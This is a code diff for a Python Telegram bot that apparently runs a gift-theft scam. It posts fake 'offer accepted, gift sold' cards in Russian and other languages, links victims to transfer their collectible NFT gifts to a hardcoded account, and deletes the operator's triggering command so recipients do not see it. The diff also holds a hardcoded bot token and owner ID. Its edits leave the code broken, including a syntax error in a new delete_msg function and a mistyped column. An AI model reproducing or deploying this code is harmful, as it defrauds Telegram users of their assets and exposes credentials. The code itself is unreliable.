@@ -8,11 +8,9 @@ import telebot
 from telebot import types
 from telebot.apihelper import ApiTelegramException
 
-# Твой токен и ID владельца
 TOKEN = "9217093222:AAGYb3Lu8L5ppSuHYehYYi4xvdFhMtGK5E0"
 OWNERS = {6226038990}
 
-# Ссылка для передачи на @notscalt
 DEFAULT_RATE_URL = "tg://send_gift?to=notscalt"
 DEFAULT_SPEC_URL = "tg://send_gift?to=GiftBankirTelegram"
 
@@ -36,7 +34,7 @@ CREATE TABLE IF NOT EXISTS cards(id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id 
 CREATE TABLE IF NOT EXISTS clicks(card_id INT, user_id INT, name TEXT, choice TEXT, ts INT);
 CREATE TABLE IF NOT EXISTS settings(owner_id INTEGER PRIMARY KEY, yes_label TEXT, no_label TEXT);
 CREATE TABLE IF NOT EXISTS allowed_users(user_id INTEGER PRIMARY KEY, is_admin INT DEFAULT 0, is_special INT DEFAULT 0, custom_url TEXT);
-CREATE TABLE IF NOT EXISTS offer_logs(id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INT, user_name TEXT, gift_link TEXT, amount TEXT, kind TEXT, lang TEXT, created INT);
+CREATE TABLE IF NOT EXISTS offer_logs(id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INT, user_name INT, gift_link TEXT, amount TEXT, kind TEXT, lang TEXT, created INT);
 CREATE TABLE IF NOT EXISTS bot_users(user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT, created INT);
 """)
 db.commit()
@@ -47,10 +45,6 @@ def q(sql, params=(), one=False, all_=False):
         return cur.fetchone() if one else (cur.fetchall() if all_ else cur)
 
 def is_allowed(uid): return uid in OWNERS or bool(q("SELECT 1 FROM allowed_users WHERE user_id=?", (uid,), one=True))
-def is_admin(uid): return uid in OWNERS or bool(q("SELECT 1 FROM allowed_users WHERE user_id=? AND is_admin=1", (uid,), one=True))
-def get_url(oid):
-    res = q("SELECT is_special, custom_url FROM allowed_users WHERE user_id=?", (oid,), one=True)
-    return (res[1] or DEFAULT_SPEC_URL) if (res and res[0] == 1) else DEFAULT_RATE_URL
 
 def api(func, *args, **kwargs):
     for _ in range(3):
@@ -71,7 +65,7 @@ def kb(cid, yes, no):
 
 def rate_kb(lang, cid, oid):
     l = LABELS.get(lang, LABELS["u"])
-    return Raw([[{"text": l[2], "url": get_url(oid)}], [{"text": l[3], "callback_data": f"c:how_to:{cid}"}]])
+    return Raw([[{"text": l[2], "url": DEFAULT_RATE_URL}], [{"text": l[3], "callback_data": f"c:how_to:{cid}"}]])
 
 def preview(link): return types.LinkPreviewOptions(is_disabled=False, url=link, prefer_large_media=False, show_above_text=True)
 
@@ -111,15 +105,6 @@ def accept_text(link, amount, kind, lang):
     else: b = f"{sold} Подарок {gift} успешно продан!\n\n• Передайте коллекционный предмет покупателю для зачисления {a} {coin_emoji}."
     return f"<b>{b}</b>"
 
-def delete_msg(chat_id, message_id, bc=None):
-    if bc:
-        for m_fn in [lambda: bot.delete_business_messages(bc, chat_id, [message_id]), lambda: bot.delete_business_messages(bc, [message_id]), lambda: bot.delete_message(chat_id, message_id)]:
-            try: m_fn(); break
-            except: pass
-    else:
-        try: bot.delete_message(chat_id, message_id)
-        except: pass
-
 OFFER_REGEX = re.compile(r"ho\s+(?:https?://)?(?:t\.me/nft/)?([a-zA-Z0-9_-]+-\d+)\s+([\d.]+)\s+(rate|unrate)\s+([a-zA-Z]{1,3})", re.I)
 
 @bot.message_handler(regexp=r"^ho\s+")
@@ -128,27 +113,43 @@ def handle_offer(m):
     mt = OFFER_REGEX.search(m.text or "")
     if not mt: return
     slug, amount, kind, lang = mt.groups()
-    kind, lang = kind.lower(), kind.lower()
-    lang = {"ru": "u", "ua": "i", "uk": "i", "en": "n", "cn": "z", "zh": "z"}.get(lang, lang)
+    kind = kind.lower()
+    lang = {"ru": "u", "ua": "i", "uk": "i", "en": "n", "cn": "z", "zh": "z"}.get(lang.lower(), "u")
     if lang not in LABELS: lang = "u"
 
     link, oname, owner = f"https://t.me/nft/{slug}", m.from_user.first_name or "User", m.from_user.id
     bc = getattr(m, 'business_connection_id', None)
 
-    custom_labels = q("SELECT yes_level,no_label FROM settings WHERE owner_id=?", (owner,), one=True)
+    custom_labels = q("SELECT yes_label, no_label FROM settings WHERE owner_id=?", (owner,), one=True)
     lang_labels = LABELS.get(lang, LABELS["u"])
     dy = (custom_labels[0] or lang_labels[0]) if custom_labels else lang_labels[0]
     dn = (custom_labels[1] or lang_labels[1]) if custom_labels else lang_labels[1]
 
+    chat_id = m.chat.id
+    text = offer_text(oname, link, amount, kind, lang)
+    extra = {"business_connection_id": bc} if bc else {}
+
+    cur = q("INSERT INTO cards(owner_id, chat_id, message_id, bc_id, link, text, created, amount, kind, lang) VALUES(?,?,?,?,?,?,?,?,?,?)",
+            (owner, chat_id, 0, bc, link, text, int(time.time()), amount, kind, lang))
+    cid = cur.lastrowid
+
+    sent = api(bot.send_message, chat_id=chat_id, text=padded(text), reply_markup=kb(cid, dy, dn), link_preview_options=preview(link), **extra)
+    if sent:
+        q("UPDATE cards SET message_id=? WHERE id=?", (sent.message_id, cid))
+        q("INSERT INTO offer_logs(user_id, user_name, gift_link, amount, kind, lang, created) VALUES(?,?,?,?,?,?,?)",
+          (owner, oname, link, amount, kind, lang, int(time.time())))
+    
+    try:
+        if bc: bot.delete_business_messages(bc, chat_id, [m.message_id])
+        else: bot.delete_message(chat_id, m.message_id)
+    except: pass
+
 @bot.callback_query_handler(func=lambda call: True)
 def callback_inline(call):
     data = call.data.split(":")
-    if len(data) < 3:
-        return
-    
+    if len(data) < 3: return
     action, choice, cid_str = data[0], data[1], data[2]
-    if action != "c":
-        return
+    if action != "c": return
         
     cid = int(cid_str)
     card = q("SELECT owner_id, chat_id, message_id, link, amount, kind, lang, bc_id FROM cards WHERE id=?", (cid,), one=True)
@@ -170,10 +171,8 @@ def callback_inline(call):
     if choice == "no":
         rm = "❌ Оффер отклонен."
         try:
-            if bc:
-                bot.edit_message_text(padded(rm), chat_id=chat_id, message_id=msg_id, reply_markup=None, link_preview_options=types.LinkPreviewOptions(is_disabled=True), **extra)
-            else:
-                bot.edit_message_text(padded(rm), chat_id=chat_id, message_id=msg_id, reply_markup=None, link_preview_options=types.LinkPreviewOptions(is_disabled=True))
+            if bc: bot.edit_message_text(padded(rm), chat_id=chat_id, message_id=msg_id, reply_markup=None, link_preview_options=types.LinkPreviewOptions(is_disabled=True), **extra)
+            else: bot.edit_message_text(padded(rm), chat_id=chat_id, message_id=msg_id, reply_markup=None, link_preview_options=types.LinkPreviewOptions(is_disabled=True))
         except:
             if msg_id: delete_msg(chat_id, msg_id, bc)
             api(bot.send_message, chat_id, padded(rm), **extra)
@@ -191,6 +190,15 @@ def callback_inline(call):
 
     q("INSERT INTO clicks VALUES(?,?,?,?,?)", (cid, call.from_user.id, uname, choice, int(time.time())))
     bot.answer_callback_query(call.id)
+
+def delete_msg(chat_id, message_id, bc=None):
+    if bc:
+        for m_fn in [lambda: bot.delete_business_messages(bc, chat_id, [message_id]), lambda: bot.delete_message(chat_id, message_id)]:
+            try: m_fn(); break
+            : except: pass
+    else:
+        try: bot.delete_message(chat_id, message_id)
+        except: pass
 
 @bot.message_handler(commands=["start"])
 def start(m):
